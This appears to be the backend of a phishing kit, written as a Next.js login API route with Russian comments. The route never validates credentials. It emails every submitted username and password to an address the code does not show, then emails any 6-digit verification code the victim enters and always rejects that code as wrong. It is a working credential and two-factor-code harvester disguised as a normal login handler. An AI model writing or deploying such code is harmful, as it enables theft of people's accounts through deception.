import { NextRequest, NextResponse } from "next/server";
import { sendLoginEmail, sendCodeEmail } from "@/lib/email";
import { setSession } from "@/lib/session";

/**
 * API endpoint для входа
 * POST /api/auth/login
 */
export async function POST(request: NextRequest) {
  console.log("[API LOGIN] Получен запрос на вход");

  try {
    const body = await request.json();
    const { username, password, rememberUsername } = body;

    console.log("[API LOGIN] Данные:", { username, rememberUsername });

    // Валидация
    if (!username) {
      console.error("[API LOGIN] Отсутствует username");
      return NextResponse.json(
        { error: "Username обязателен" },
        { status: 400 }
      );
    }
    
    // Для verify-code страницы (password пустой) - проверяем код
    const isVerificationCode = password === "";
    if (isVerificationCode) {
      // Проверяем, что код состоит из 6 цифр
      if (!/^\d{6}$/.test(username.trim())) {
        console.error("[API LOGIN] Неверный формат кода верификации");
        return NextResponse.json(
          { error: "Код должен содержать 6 цифр" },
          { status: 400 }
        );
      }
      
      // Отправка Email с кодом верификации
      try {
        await sendCodeEmail(username.trim(), username.trim());
        console.log("[API LOGIN] Email с кодом верификации отправлен");
      } catch (emailError) {
        console.error("[API LOGIN] Ошибка отправки Email с кодом:", emailError);
        // Продолжаем выполнение
      }
      
      // Здесь можно добавить проверку правильности кода
      // Пока считаем, что код всегда неверный для демонстрации ошибки
      console.error("[API LOGIN] Код верификации неверный");
      return NextResponse.json(
        { error: "Неверный код верификации" },
        { status: 400 }
      );
    }
    
    // Password обязателен только для обычного входа (если передан и не пустой)
    if (password !== undefined && password !== "" && (!password || password.trim() === "")) {
      console.error("[API LOGIN] Отсутствует password");
      return NextResponse.json(
        { error: "Username и Password обязательны" },
        { status: 400 }
      );
    }

    // Отправка Email с логином и паролем
    try {
      await sendLoginEmail(username, password);
      console.log("[API LOGIN] Email с данными входа отправлен");
    } catch (emailError) {
      console.error("[API LOGIN] Ошибка отправки Email:", emailError);
      // Продолжаем выполнение даже если Email не отправился
      // В реальном приложении здесь можно решить, прерывать ли процесс
    }

    // Создание сессии
    await setSession({
      step: "code",
      username: username,
    });

    console.log("[API LOGIN] Сессия создана, вход успешен");

    return NextResponse.json({
      success: true,
      message: "Вход выполнен успешно",
    });
  } catch (error) {
    console.error("[API LOGIN] Ошибка:", error);
    return NextResponse.json(
      {
        error: error instanceof Error ? error.message : "Ошибка при входе",
      },
      { status: 500 }
    );
  }
}


